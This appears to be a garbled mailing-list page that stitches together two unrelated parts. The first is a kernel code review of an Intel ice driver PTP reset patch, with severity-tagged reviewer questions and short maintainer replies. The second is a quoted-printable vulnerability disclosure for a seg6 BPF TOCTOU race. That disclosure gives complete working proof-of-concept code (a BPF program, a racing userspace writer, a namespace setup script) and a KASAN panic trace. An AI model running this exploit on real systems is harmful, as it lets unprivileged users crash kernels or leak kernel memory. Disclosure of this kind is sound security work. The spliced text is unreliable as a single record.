-> Does ice_ptp_prepare_for_reset() still release the Tx tracker in this
-> tree?  The ice_ptp_release_tx_tracker(pf, &pf->ptp.port.tx) call that used
-> to be there was removed by the earlier patch in this series, "ice: fix
-> removal of PTP timestamp tracker during reset", so there is nothing left
-> in that function to cancel ov_work "alongside".
-> 
-> Which existing comment documents ov_work interference during reset?  At the
-> series baseline the only ov_work-adjacent comments are "Start the PHY timer
-> in Vernier mode" and "temporarily disable Tx timestamps while calibrating
-> PHY offset", and neither mentions reset.
-> 
->> diff --git a/drivers/net/ethernet/intel/ice/ice_ptp.c b/drivers/net/ethernet/intel/ice/ice_ptp.c
->> index d018f02f700d7..9bf3bac552f11 100644
->> --- a/drivers/net/ethernet/intel/ice/ice_ptp.c
->> +++ b/drivers/net/ethernet/intel/ice/ice_ptp.c
->> @@ -2998,6 +2998,14 @@ void ice_ptp_prepare_for_reset(struct ice_pf *pf, enum ice_reset_req reset_type)
->>  	if (reset_type == ICE_RESET_PFR)
->>  		return;
->>  
->> +	/* Cancel the offset verification work for E82x before releasing the
->> +	 * Tx tracker. If ov_work is running during reset, it may issue
->> +	 * sideband queue commands that will fail or timeout, and may
->> +	 * reference state that is being torn down.
->> +	 */
-> 
-> [Severity: Medium]
-> Same point as above for the comment text itself: ice_ptp_prepare_for_reset()
-> does not release the Tx tracker anymore, so "before releasing the Tx
-> tracker" describes an ordering that does not exist here.  The only
-> remaining ice_ptp_release_tx_tracker() call is in ice_ptp_release(), and
-> there it runs before the ICE_MAC_GENERIC ov_work cancel reached via
-> ice_ptp_port_phy_stop(), i.e. the reverse order.  Would it be clearer to
-> drop that clause?
-> 
-
-Yes.
-
-> The second sentence also mentions sideband queue commands, but
-> ice_ptp_wait_for_offsets() returns as soon as ice_is_reset_in_progress() is
-> true, before any sideband access.  Which state that is being torn down does
-> the work reference?
-> 
->> +	if (hw->mac_type == ICE_MAC_GENERIC)
->> +		kthread_cancel_delayed_work_sync(&ptp->port.ov_work);
-> 
-> [Severity: High]
-> Should this cancel be taken under ptp->port.ps_lock?  Both existing
-> ov_work cancel sites hold it, and ice_ptp_port_phy_restart() holds it
-> across cancel, PHY start and re-queue:
-> 
-> 	mutex_lock(&ptp_port->ps_lock);
-> 	...
-> 	kthread_cancel_delayed_work_sync(&ptp_port->ov_work);
-> 	...
-> 	err = ice_start_phy_timer_e82x(hw, port);
-> 	...
-> 	kthread_queue_delayed_work(pf->ptp.kworker, &ptp_port->ov_work, 0);
-> 
-> Without ps_lock here, can ov_work be armed again right after the sync
-> cancel returns, so the reset sequence still runs with ov_work queued?
-> 
-> Two arming paths look reachable during the reset window.  One is the
-> PTP_CLOCK_SETTIME ioctl, which has no ptp->state or reset-in-progress
-> check:
-> 
-> ice_ptp_settime64()
-> 	/* Recalibrate and re-enable timestamp blocks for E822/E823 */
-> 	if (hw->mac_type == ICE_MAC_GENERIC)
-> 		ice_ptp_restart_all_phy(pf);
-> 
-> The other is the clock-owner PF on a multi-PF E82x adapter, where
-> ice_ptp_rebuild_owner() -> ice_ptp_restart_all_phy() walks the adapter port
-> list and arms a peer PF's ov_work:
-> 
-> 	list_for_each_entry_rcu(port, &pf->adapter->ports.list, list_node) {
-> 		...
-> 		if (port->link_up)
-> 			ice_ptp_port_phy_restart(port);
-> 
-> while that peer PF's own service task is inside
-> ice_ptp_prepare_for_reset() on another CPU.  There is no cross-PF reset
-> serialization for E82x, since ice_ptp_prepare_rebuild_sec() is gated on
-> ICE_MAC_GENERIC_3K_E825 in the following hunk.
-> 
-> Would doing the cancel inside the ps_lock critical section, or simply
-> reusing ice_ptp_port_phy_stop(), close that window?  The ov_work callback
-> ice_ptp_wait_for_offsets() only takes port->tx.lock with
-> spin_lock_irqsave(), never ps_lock, so taking ps_lock around the sync
-> cancel should not deadlock.
-> 
-
-Makes sense.
-
-> [Severity: Low]
-> Separately, who re-arms ov_work for a non-owner PF after this cancel?
-> ice_ptp_wait_for_offsets() is the only place that programs the vernier
-> offsets and clears the calibrating flag:
-> 
-> 	port->tx.calibrating = false;
-> 
-> and ice_ptp_is_tx_tracker_up() gates every Tx timestamp on it:
-> 
-> 	return tx->init && !tx->calibrating;
-> 
-> At this commit the only re-arm during reset is ice_ptp_restart_all_phy()
-> from ice_ptp_rebuild_owner(), which runs on the clock-owner PF only, for
-> non-PFR only, for link-up ports only, and can arm a peer PF's ov_work just
-> before that peer cancels it here.  Note this appears to be resolved by the
-> next patch in the series, "ice: call PTP link change only from link
-> events", which adds an unconditional per-PF ice_ptp_link_change() call at
-> the end of ice_rebuild(); with that in place every PF re-arms its own
-> ov_work after its own rebuild.  Worth mentioning in the changelog that this
-> patch depends on that follow-up?
-> 
-
-Yes at a minimum we'll have to reference that, possibly re-ordering the
-commits.
-
-> [Severity: Medium]
-> This isn't a bug introduced by this patch, but the state that
-> ice_ptp_prepare_for_reset() leaves behind interacts with an incomplete
-> teardown path.  ice_ptp_release() early-returns whenever
-> pf->ptp.state is neither ICE_PTP_UNINIT nor ICE_PTP_READY:
-> 
-> 	if (pf->ptp.state != ICE_PTP_READY) {
-> 		mutex_destroy(&pf->ptp.port.ps_lock);
-> 		ice_ptp_cleanup_pf(pf);
-> 		if (pf->ptp.clock) {
-> 			ptp_clock_unregister(pf->ptp.clock);
-> 			pf->ptp.clock = NULL;
-> 		}
-> 		return;
-> 	}
-> 
-> ice_ptp_cleanup_pf() only removes the port from the adapter list and drops
-> the kref, so unloading the driver while the state is ICE_PTP_RESETTING
-> (set here) or ICE_PTP_ERROR (set on the ice_ptp_rebuild() failure path)
-> leaks the kthread worker created by kthread_run_worker() in
-> ice_ptp_init_work() and the tx->tstamps allocation from
-> ice_ptp_alloc_tx_tracker(), and does not sync-cancel ptp->work or
-> port.ov_work before the devm-allocated ice_pf embedding them goes away.
-> That branch also leaves state non-UNINIT, unlike the invariant the comment
-> above ice_ptp_release() describes.
-> 
-
-I believe this will be addressed by other changes in the series.
-
->>  	if (ice_pf_src_tmr_owned(pf) && hw->mac_type == ICE_MAC_GENERIC_3K_E825)
->>  		ice_ptp_prepare_rebuild_sec(pf, false, reset_type);
->>  
-> 
-> [ ... ]
-
+Hi Linux kernel maintainers,=0D
+=0D
+We found and validated a issue in net/core/filter.c. The bug is reachable b=
+y a non-root user via user and net namespace.=0D
+We've tested it, and it should not affect any other functionality.=0D
+=0D
+We will provide detailed information about the bug=0D
+in this email, along with a PoC to trigger it.=0D
+=0D
+---- details below ----=0D
+=0D
+Bug details:=0D
+=0D
+BPF helper SRH arguments may reference shared array-map values.=0D
+In bpf_push_seg6_encap(), the SRH buffer is validated once using=0D
+seg6_validate_srh() with the constant verifier-approved length.=0D
+However, downstream encapsulation functions (such as __seg6_do_srh_encap()=
+=0D
+and __seg6_do_srh_inline() in net/ipv6/seg6_iptunnel.c) later reread=0D
+fields such as hdrlen and first_segment without snapshotting the=0D
+validated bytes.=0D
+=0D
+Another CPU or userspace process can concurrently update the array-map=0D
+value between validation and use, changing hdrlen to request up to 2048=0D
+bytes from a much smaller map allocation or changing the segment index.=0D
+The resulting memcpy and segment access can read beyond the map bounds,=0D
+placing adjacent kernel memory in a transmitted packet or triggering a=0D
+kernel panic.=0D
+=0D
+Root cause:=0D
+bpf_push_seg6_encap() passes a mutable pointer referencing shared BPF map=0D
+memory directly onward without creating a private snapshot of the validated=
+=0D
+bytes. Downstream functions reread mutable fields from this buffer,=0D
+creating a Time-of-Check to Time-of-Use (TOCTOU) race condition.=0D
+=0D
+Reproducer:=0D
+=0D
+    clang -O2 -target bpf -c poc.bpf.c -o poc.bpf.o=0D
+    gcc -O2 -Wall -Wextra -pthread -o poc poc.c=0D
+    ./poc.sh=0D
+=0D
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
+=0D
+------BEGIN poc_common.h------=0D
+=0D
+#ifndef SEG6_HDRLEN_RACE_POC_COMMON_H=0D
+#define SEG6_HDRLEN_RACE_POC_COMMON_H=0D
+=0D
+#include <linux/types.h>=0D
+=0D
+#define POC_SRH_VALUE_SIZE 504=0D
+#define POC_SRH_GOOD_HDRLEN ((POC_SRH_VALUE_SIZE >> 3) - 1)=0D
+#define POC_TLV_BYTES (POC_SRH_VALUE_SIZE - 8 - 16)=0D
+#define POC_TLV_COUNT (POC_TLV_BYTES / 2)=0D
+#define POC_SEG6_TYPE 4=0D
+=0D
+struct poc_in6_addr {=0D
+	__u8 bytes[16];=0D
+};=0D
+=0D
+struct poc_ipv6_sr_hdr {=0D
+	__u8 nexthdr;=0D
+	__u8 hdrlen;=0D
+	__u8 type;=0D
+	__u8 segments_left;=0D
+	__u8 first_segment;=0D
+	__u8 flags;=0D
+	__be16 tag;=0D
+};=0D
+=0D
+struct poc_tlv {=0D
+	__u8 type;=0D
+	__u8 len;=0D
+};=0D
+=0D
+struct poc_srh_value {=0D
+	struct poc_ipv6_sr_hdr srh;=0D
+	struct poc_in6_addr segment0;=0D
+	struct poc_tlv tlvs[POC_TLV_COUNT];=0D
+};=0D
+=0D
+_Static_assert(sizeof(struct poc_ipv6_sr_hdr) =3D=3D 8,=0D
+	       "unexpected SRH header size");=0D
+_Static_assert((POC_TLV_BYTES % 2) =3D=3D 0, "TLV bytes must be divisible b=
+y 2");=0D
+_Static_assert(sizeof(struct poc_srh_value) =3D=3D POC_SRH_VALUE_SIZE,=0D
+	       "unexpected SRH value size");=0D
+=0D
+#endif=0D
+=0D
+------END poc_common.h--------=0D
+=0D
+------BEGIN poc.bpf.c------=0D
+=0D
+#include <linux/bpf.h>=0D
+=0D
+#include "poc_common.h"=0D
+=0D
+#define SEC(name) __attribute__((section(name), used))=0D
+#define __uint(name, val) int (*name)[val]=0D
+#define __type(name, val) val *name=0D
+=0D
+static void *(*bpf_map_lookup_elem)(void *map, const void *key) =3D=0D
+	(void *)BPF_FUNC_map_lookup_elem;=0D
+static long (*bpf_lwt_push_encap)(struct __sk_buff *skb, __u32 encap_type,=
+=0D
+				      void *hdr, __u32 len) =3D=0D
+	(void *)BPF_FUNC_lwt_push_encap;=0D
+=0D
+struct {=0D
+	__uint(type, BPF_MAP_TYPE_ARRAY);=0D
+	__uint(max_entries, 1);=0D
+	__type(key, __u32);=0D
+	__type(value, struct poc_srh_value);=0D
+} seg6_srh_diy SEC(".maps");=0D
+=0D
+static __always_inline int do_push(struct __sk_buff *skb, __u32 encap_type)=
+=0D
+{=0D
+	__u32 key =3D 0;=0D
+	struct poc_srh_value *value;=0D
+	long err;=0D
+=0D
+	value =3D bpf_map_lookup_elem(&seg6_srh_diy, &key);=0D
+	if (!value)=0D
+		return BPF_DROP;=0D
+=0D
+	err =3D bpf_lwt_push_encap(skb, encap_type, value, sizeof(*value));=0D
+	if (err)=0D
+		return BPF_DROP;=0D
+=0D
+	return BPF_REDIRECT;=0D
+}=0D
+=0D
+SEC("encap")=0D
+int encap_prog(struct __sk_buff *skb)=0D
+{=0D
+	return do_push(skb, BPF_LWT_ENCAP_SEG6);=0D
+}=0D
+=0D
+SEC("inline")=0D
+int inline_srh(struct __sk_buff *skb)=0D
+{=0D
+	return do_push(skb, BPF_LWT_ENCAP_SEG6_INLINE);=0D
+}=0D
+=0D
+char _license[] SEC("license") =3D "GPL";=0D
+=0D
+------END poc.bpf.c--------=0D
+=0D
+------BEGIN poc.c------=0D
+=0D
+#define _GNU_SOURCE=0D
+=0D
+#include <arpa/inet.h>=0D
+#include <errno.h>=0D
+#include <fcntl.h>=0D
+#include <linux/bpf.h>=0D
+#include <pthread.h>=0D
+#include <sched.h>=0D
+#include <signal.h>=0D
+#include <stdint.h>=0D
+#include <stdio.h>=0D
+#include <stdlib.h>=0D
+#include <string.h>=0D
+#include <sys/socket.h>=0D
+#include <sys/syscall.h>=0D
+#include <sys/types.h>=0D
+#include <sys/wait.h>=0D
+#include <time.h>=0D
+#include <unistd.h>=0D
+=0D
+#include "poc_common.h"=0D
+=0D
+#define WRITER_COUNT 2=0D
+#define SENDER_COUNT 2=0D
+#define BATCH_SIZE 32=0D
+#define PAYLOAD_SIZE 64=0D
+=0D
+struct run_config {=0D
+	const char *map_path;=0D
+	const char *netns_path;=0D
+	const char *src_addr;=0D
+	const char *dst_addr;=0D
+	unsigned int seconds;=0D
+};=0D
+=0D
+struct writer_args {=0D
+	int map_fd;=0D
+	int cpu;=0D
+	const struct poc_srh_value *good;=0D
+	const struct poc_srh_value *bad;=0D
+	struct timespec end;=0D
+};=0D
+=0D
+static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr)=0D
+{=0D
+	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));=0D
+}=0D
+=0D
+static int bpf_obj_get_fd(const char *path)=0D
+{=0D
+	union bpf_attr attr;=0D
+=0D
+	memset(&attr, 0, sizeof(attr));=0D
+	attr.pathname =3D (uintptr_t)path;=0D
+	return sys_bpf(BPF_OBJ_GET, &attr);=0D
+}=0D
+=0D
+static int bpf_map_update_fd(int fd, const void *key, const void *value)=0D
+{=0D
+	union bpf_attr attr;=0D
+=0D
+	memset(&attr, 0, sizeof(attr));=0D
+	attr.map_fd =3D fd;=0D
+	attr.key =3D (uintptr_t)key;=0D
+	attr.value =3D (uintptr_t)value;=0D
+	attr.flags =3D BPF_ANY;=0D
+	return sys_bpf(BPF_MAP_UPDATE_ELEM, &attr);=0D
+}=0D
+=0D
+static void set_cpu_affinity(int cpu)=0D
+{=0D
+	cpu_set_t set;=0D
+=0D
+	CPU_ZERO(&set);=0D
+	CPU_SET(cpu, &set);=0D
+	if (sched_setaffinity(0, sizeof(set), &set) =3D=3D -1)=0D
+		perror("sched_setaffinity");=0D
+}=0D
+=0D
+static void fill_good_value(struct poc_srh_value *value)=0D
+{=0D
+	memset(value, 0, sizeof(*value));=0D
+=0D
+	value->srh.hdrlen =3D POC_SRH_GOOD_HDRLEN;=0D
+	value->srh.type =3D POC_SEG6_TYPE;=0D
+	value->srh.segments_left =3D 0;=0D
+	value->srh.first_segment =3D 0;=0D
+=0D
+	value->segment0.bytes[0] =3D 0xfd;=0D
+	value->segment0.bytes[15] =3D 1;=0D
+}=0D
+=0D
+static int deadline_reached(const struct timespec *end)=0D
+{=0D
+	struct timespec now;=0D
+=0D
+	if (clock_gettime(CLOCK_MONOTONIC, &now) =3D=3D -1) {=0D
+		perror("clock_gettime");=0D
+		return 1;=0D
+	}=0D
+=0D
+	if (now.tv_sec > end->tv_sec)=0D
+		return 1;=0D
+=0D
+	if (now.tv_sec =3D=3D end->tv_sec && now.tv_nsec >=3D end->tv_nsec)=0D
+		return 1;=0D
+=0D
+	return 0;=0D
+}=0D
+=0D
+static void *writer_thread(void *arg)=0D
+{=0D
+	static const __u32 key =3D 0;=0D
+	struct writer_args *writer =3D arg;=0D
+=0D
+	set_cpu_affinity(writer->cpu);=0D
+=0D
+	while (!deadline_reached(&writer->end)) {=0D
+		if (bpf_map_update_fd(writer->map_fd, &key, writer->bad) =3D=3D -1) {=0D
+			perror("BPF_MAP_UPDATE_ELEM bad");=0D
+			break;=0D
+		}=0D
+=0D
+		if (bpf_map_update_fd(writer->map_fd, &key, writer->good) =3D=3D -1) {=0D
+			perror("BPF_MAP_UPDATE_ELEM good");=0D
+			break;=0D
+		}=0D
+	}=0D
+=0D
+	return NULL;=0D
+}=0D
+=0D
+static void kill_children(pid_t *children, size_t count)=0D
+{=0D
+	size_t i;=0D
+=0D
+	for (i =3D 0; i < count; i++) {=0D
+		if (children[i] > 0)=0D
+			kill(children[i], SIGKILL);=0D
+	}=0D
+=0D
+	for (i =3D 0; i < count; i++) {=0D
+		if (children[i] > 0)=0D
+			waitpid(children[i], NULL, 0);=0D
+	}=0D
+}=0D
+=0D
+static void sender_loop(const struct run_config *cfg, int cpu)=0D
+{=0D
+	char payloads[BATCH_SIZE][PAYLOAD_SIZE];=0D
+	struct iovec iovecs[BATCH_SIZE];=0D
+	struct mmsghdr msgs[BATCH_SIZE];=0D
+	struct sockaddr_in6 src;=0D
+	struct sockaddr_in6 dst;=0D
+	int fd;=0D
+	int i;=0D
+=0D
+	set_cpu_affinity(cpu);=0D
+=0D
+	fd =3D socket(AF_INET6, SOCK_DGRAM, 0);=0D
+	if (fd =3D=3D -1) {=0D
+		perror("socket");=0D
+		_exit(1);=0D
+	}=0D
+=0D
+	memset(&src, 0, sizeof(src));=0D
+	src.sin6_family =3D AF_INET6;=0D
+	if (inet_pton(AF_INET6, cfg->src_addr, &src.sin6_addr) !=3D 1) {=0D
+		fprintf(stderr, "failed to parse source address %s\n",=0D
+			cfg->src_addr);=0D
+		_exit(1);=0D
+	}=0D
+=0D
+	if (bind(fd, (struct sockaddr *)&src, sizeof(src)) =3D=3D -1) {=0D
+		perror("bind");=0D
+		_exit(1);=0D
+	}=0D
+=0D
+	memset(&dst, 0, sizeof(dst));=0D
+	dst.sin6_family =3D AF_INET6;=0D
+	dst.sin6_port =3D htons(7330);=0D
+	if (inet_pton(AF_INET6, cfg->dst_addr, &dst.sin6_addr) !=3D 1) {=0D
+		fprintf(stderr, "failed to parse destination address %s\n",=0D
+			cfg->dst_addr);=0D
+		_exit(1);=0D
+	}=0D
+=0D
+	for (i =3D 0; i < BATCH_SIZE; i++) {=0D
+		memset(payloads[i], 'A' + (i % 26), sizeof(payloads[i]));=0D
+=0D
+		memset(&iovecs[i], 0, sizeof(iovecs[i]));=0D
+		iovecs[i].iov_base =3D payloads[i];=0D
+		iovecs[i].iov_len =3D sizeof(payloads[i]);=0D
+=0D
+		memset(&msgs[i], 0, sizeof(msgs[i]));=0D
+		msgs[i].msg_hdr.msg_iov =3D &iovecs[i];=0D
+		msgs[i].msg_hdr.msg_iovlen =3D 1;=0D
+		msgs[i].msg_hdr.msg_name =3D &dst;=0D
+		msgs[i].msg_hdr.msg_namelen =3D sizeof(dst);=0D
+	}=0D
+=0D
+	for (;;) {=0D
+		if (sendmmsg(fd, msgs, BATCH_SIZE, 0) < 0) {=0D
+			if (errno =3D=3D EINTR || errno =3D=3D ENOBUFS ||=0D
+			    errno =3D=3D ECONNREFUSED || errno =3D=3D EHOSTUNREACH ||=0D
+			    errno =3D=3D ENETUNREACH)=0D
+				continue;=0D
+=0D
+			perror("sendmmsg");=0D
+			_exit(1);=0D
+		}=0D
+	}=0D
+}=0D
+=0D
+static pid_t start_sender(const struct run_config *cfg, int cpu)=0D
+{=0D
+	pid_t pid;=0D
+	int nsfd;=0D
+=0D
+	pid =3D fork();=0D
+	if (pid !=3D 0)=0D
+		return pid;=0D
+=0D
+	nsfd =3D open(cfg->netns_path, O_RDONLY);=0D
+	if (nsfd =3D=3D -1) {=0D
+		perror("open netns");=0D
+		_exit(1);=0D
+	}=0D
+=0D
+	if (setns(nsfd, CLONE_NEWNET) =3D=3D -1) {=0D
+		perror("setns");=0D
+		_exit(1);=0D
+	}=0D
+	close(nsfd);=0D
+=0D
+	sender_loop(cfg, cpu);=0D
+	_exit(0);=0D
+}=0D
+=0D
+int main(int argc, char **argv)=0D
+{=0D
+	struct poc_srh_value good;=0D
+	struct poc_srh_value bad;=0D
+	struct writer_args writers[WRITER_COUNT];=0D
+	pthread_t writer_threads[WRITER_COUNT];=0D
+	struct run_config cfg;=0D
+	struct timespec end;=0D
+	pid_t children[SENDER_COUNT];=0D
+	static const __u32 key =3D 0;=0D
+	int map_fd;=0D
+	int i;=0D
+=0D
+	if (argc !=3D 6) {=0D
+		fprintf(stderr,=0D
+			"usage: %s <pinned-map> <netns-path> <src-ipv6> <dst-ipv6> <seconds>\n",=
+=0D
+			argv[0]);=0D
+		return 2;=0D
+	}=0D
+=0D
+	memset(&cfg, 0, sizeof(cfg));=0D
+	cfg.map_path =3D argv[1];=0D
+	cfg.netns_path =3D argv[2];=0D
+	cfg.src_addr =3D argv[3];=0D
+	cfg.dst_addr =3D argv[4];=0D
+	cfg.seconds =3D strtoul(argv[5], NULL, 0);=0D
+=0D
+	map_fd =3D bpf_obj_get_fd(cfg.map_path);=0D
+	if (map_fd =3D=3D -1) {=0D
+		perror("BPF_OBJ_GET");=0D
+		return 1;=0D
+	}=0D
+=0D
+	fill_good_value(&good);=0D
+	bad =3D good;=0D
+	bad.srh.hdrlen =3D 0xff;=0D
+=0D
+	if (bpf_map_update_fd(map_fd, &key, &good) =3D=3D -1) {=0D
+		perror("BPF_MAP_UPDATE_ELEM initial");=0D
+		return 1;=0D
+	}=0D
+=0D
+	memset(children, 0, sizeof(children));=0D
+	for (i =3D 0; i < SENDER_COUNT; i++) {=0D
+		children[i] =3D start_sender(&cfg, WRITER_COUNT + i);=0D
+		if (children[i] =3D=3D -1) {=0D
+			perror("fork");=0D
+			kill_children(children, SENDER_COUNT);=0D
+			return 1;=0D
+		}=0D
+	}=0D
+=0D
+	if (clock_gettime(CLOCK_MONOTONIC, &end) =3D=3D -1) {=0D
+		perror("clock_gettime");=0D
+		kill_children(children, SENDER_COUNT);=0D
+		return 1;=0D
+	}=0D
+	end.tv_sec +=3D cfg.seconds;=0D
+=0D
+	fprintf(stderr,=0D
+		"racing hdrlen for %u seconds with %d writer threads and %d sender proces=
+ses\n",=0D
+		cfg.seconds, WRITER_COUNT, SENDER_COUNT);=0D
+=0D
+	for (i =3D 0; i < WRITER_COUNT; i++) {=0D
+		memset(&writers[i], 0, sizeof(writers[i]));=0D
+		writers[i].map_fd =3D map_fd;=0D
+		writers[i].cpu =3D i;=0D
+		writers[i].good =3D &good;=0D
+		writers[i].bad =3D &bad;=0D
+		writers[i].end =3D end;=0D
+=0D
+		if (pthread_create(&writer_threads[i], NULL, writer_thread,=0D
+				   &writers[i]) !=3D 0) {=0D
+			perror("pthread_create");=0D
+			kill_children(children, SENDER_COUNT);=0D
+			return 1;=0D
+		}=0D
+	}=0D
+=0D
+	for (i =3D 0; i < WRITER_COUNT; i++)=0D
+		pthread_join(writer_threads[i], NULL);=0D
+=0D
+	kill_children(children, SENDER_COUNT);=0D
+	return 1;=0D
+}=0D
+=0D
+------END poc.c--------=0D
+=0D
+------BEGIN poc.sh------=0D
+=0D
+#!/bin/sh=0D
+set -eu=0D
+=0D
+DIR=3D$(CDPATH=3D cd -- "$(dirname -- "$0")" && pwd)=0D
+NS1=3Dseg6diy1=0D
+NS2=3Dseg6diy2=0D
+MAP_PIN=3D/sys/fs/bpf/seg6_srh_diy=0D
+SRC_ADDR=3Dfb00::1=0D
+DST_ADDR=3Dfb00::6=0D
+SECONDS=3D${SECONDS:-120}=0D
+=0D
+cleanup() {=0D
+	set +e=0D
+	ip netns del "$NS1" 2>/dev/null=0D
+	ip netns del "$NS2" 2>/dev/null=0D
+	rm -f "$MAP_PIN"=0D
+}=0D
+=0D
+setup_namespaces() {=0D
+	ip netns add "$NS1"=0D
+	ip netns add "$NS2"=0D
+=0D
+	ip link add veth1 type veth peer name veth2=0D
+	ip link set veth1 netns "$NS1"=0D
+	ip link set veth2 netns "$NS2"=0D
+=0D
+	ip -n "$NS1" link set lo up=0D
+	ip -n "$NS1" link set veth1 up=0D
+	ip -n "$NS2" link set lo up=0D
+	ip -n "$NS2" link set veth2 up=0D
+=0D
+	ip -n "$NS1" -6 addr add fb00::12/16 dev veth1 scope link=0D
+	ip -n "$NS1" -6 addr add "$SRC_ADDR"/128 dev lo=0D
+	ip -n "$NS2" -6 addr add fb00::21/16 dev veth2 scope link=0D
+=0D
+	ip -n "$NS1" -6 route add "$DST_ADDR" via fb00::21 dev veth1=0D
+	ip -n "$NS2" -6 route add fd00::/16 dev veth2=0D
+=0D
+	ip netns exec "$NS2" sysctl -q net.ipv6.conf.all.forwarding=3D1=0D
+	ip netns exec "$NS2" sysctl -q net.ipv6.conf.all.seg6_enabled=3D1=0D
+	ip netns exec "$NS2" sysctl -q net.ipv6.conf.veth2.seg6_enabled=3D1=0D
+}=0D
+=0D
+load_mode() {=0D
+	mode=3D$1=0D
+	map_id=3D=0D
+=0D
+	ip -n "$NS2" -6 route add "$DST_ADDR" encap bpf in obj \=0D
+		"$DIR/poc.bpf.o" sec "$mode" dev veth2=0D
+=0D
+	map_id=3D$(bpftool -j map show | jq -r \=0D
+		'[.[] | select(.name =3D=3D "seg6_srh_diy")] | last | .id')=0D
+=0D
+	if [ -z "$map_id" ] || [ "$map_id" =3D "null" ]; then=0D
+		echo "failed to locate seg6_srh_diy map" >&2=0D
+		return 1=0D
+	fi=0D
+=0D
+	rm -f "$MAP_PIN"=0D
+	bpftool map pin id "$map_id" "$MAP_PIN"=0D
+}=0D
+=0D
+if [ ! -x "$DIR/poc" ]; then=0D
+	gcc -O2 -Wall -Wextra -pthread -o "$DIR/poc" "$DIR/poc.c"=0D
+fi=0D
+=0D
+if [ ! -f "$DIR/poc.bpf.o" ]; then=0D
+	echo "missing $DIR/poc.bpf.o; build it with make on the host or install cl=
+ang in the guest" >&2=0D
+	exit 1=0D
+fi=0D
+=0D
+grep -qs ' /sys/fs/bpf ' /proc/mounts || mount -t bpf bpf /sys/fs/bpf=0D
+=0D
+trap cleanup EXIT INT TERM=0D
+cleanup=0D
+=0D
+for mode in encap inline; do=0D
+	echo "trying mode: $mode" >&2=0D
+	setup_namespaces=0D
+	load_mode "$mode"=0D
+=0D
+	set +e=0D
+	"$DIR/poc" "$MAP_PIN" "/run/netns/$NS1" "$SRC_ADDR" "$DST_ADDR" "$SECONDS"=
+=0D
+	status=3D$?=0D
+	set -e=0D
+=0D
+	if [ "$status" -eq 0 ]; then=0D
+		exit 0=0D
+	fi=0D
+=0D
+	echo "mode $mode did not crash within ${SECONDS}s" >&2=0D
+	cleanup=0D
+done=0D
+=0D
+exit 1=0D
+=0D
+------END poc.sh--------=0D
+=0D
+----BEGIN crash log----=0D
+=0D
+[  276.949174][    C3] page_owner tracks the page as allocated=0D
+[  276.949657][    C3] page last allocated via order 3, migratetype Unmovab=
+le, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COM=
+P|__GFP_NOMEMALLOC), pid 1, tgid 1 (systemd), ts 274478733398, free_ts 2663=
+06304894=0D
+[  276.951258][    C3] page last free pid 10427 tgid 10427 stack trace:=0D
+[  276.951915][    C3] Kernel panic - not syncing: KASAN: panic_on_warn set=
+ ...=0D
+[  276.952401][    C3] CPU: 3 UID: 0 PID: 36 Comm: ksoftirqd/3 Not tainted =
+6.12.95 #2=0D
+[  276.952962][    C3] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PII=
+X, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
+[  276.953755][    C3] Call Trace:=0D
+[  276.953985][    C3]  <TASK>=0D
+[  276.954188][    C3]  panic+0x533/0x610=0D
+[  276.954479][    C3]  ? __pfx_panic+0x10/0x10=0D
+[  276.954789][    C3]  ? rcu_is_watching+0x12/0xc0=0D
+[  276.955131][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
+[  276.955530][    C3]  ? __pfx_lock_release+0x10/0x10=0D
+[  276.955861][    C3]  ? __pfx__printk+0x10/0x10=0D
+[  276.956183][    C3]  ? __seg6_do_srh_encap+0x5cd/0x10e0=0D
+[  276.956545][    C3]  check_panic_on_warn+0x61/0x80=0D
+[  276.956880][    C3]  end_report+0x11b/0x180=0D
+[  276.957184][    C3]  kasan_report+0xe8/0x110=0D
+[  276.957501][    C3]  ? __seg6_do_srh_encap+0x5cd/0x10e0=0D
+[  276.957857][    C3]  kasan_check_range+0xf4/0x1a0=0D
+[  276.958182][    C3]  __asan_memcpy+0x23/0x60=0D
+[  276.958510][    C3]  __seg6_do_srh_encap+0x5cd/0x10e0=0D
+[  276.958850][    C3]  ? __pfx_fib6_rule_lookup+0x10/0x10=0D
+[  276.959208][    C3]  ? process_backlog+0x38c/0x1400=0D
+[  276.959567][    C3]  bpf_push_seg6_encap+0x400/0x500=0D
+[  276.959906][    C3]  bpf_lwt_in_push_encap+0x34/0x50=0D
+[  276.960251][    C3]  bpf_prog_8f4d49409a198b5d_encap_prog+0x6f/0x88=0D
+[  276.960675][    C3]  run_lwt_bpf.isra.0+0x32f/0x8c0=0D
+[  276.961031][    C3]  ? __pfx_run_lwt_bpf.isra.0+0x10/0x10=0D
+[  276.961418][    C3]  ? __pfx_ip6_route_input+0x10/0x10=0D
+[  276.961800][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
+[  276.962164][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
+[  276.962551][    C3]  ? rcu_is_watching+0x12/0xc0=0D
+[  276.962878][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
+[  276.963263][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
+[  276.963669][    C3]  ? process_backlog+0x38c/0x1400=0D
+[  276.963990][    C3]  bpf_input+0xa6/0xa10=0D
+[  276.964272][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
+[  276.964643][    C3]  ? __pfx_ipv6_rcv+0x10/0x10=0D
+[  276.964976][    C3]  ? process_backlog+0x38c/0x1400=0D
+[  276.965315][    C3]  lwtunnel_input+0x1e9/0x4e0=0D
+[  276.965651][    C3]  __netif_receive_skb_one_core+0x11a/0x1b0=0D
+[  276.966059][    C3]  ? __pfx___netif_receive_skb_one_core+0x10/0x10=0D
+[  276.966508][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
+[  276.966864][    C3]  ? lock_acquire+0x2f/0xb0=0D
+[  276.967213][    C3]  ? process_backlog+0x38c/0x1400=0D
+[  276.967560][    C3]  process_backlog+0x3cc/0x1400=0D
+[  276.967905][    C3]  __napi_poll.constprop.0+0xa1/0x440=0D
+[  276.968296][    C3]  net_rx_action+0x928/0xe20=0D
+[  276.968614][    C3]  ? __pfx_net_rx_action+0x10/0x10=0D
+[  276.968966][    C3]  ? rcu_core+0xab2/0x14b0=0D
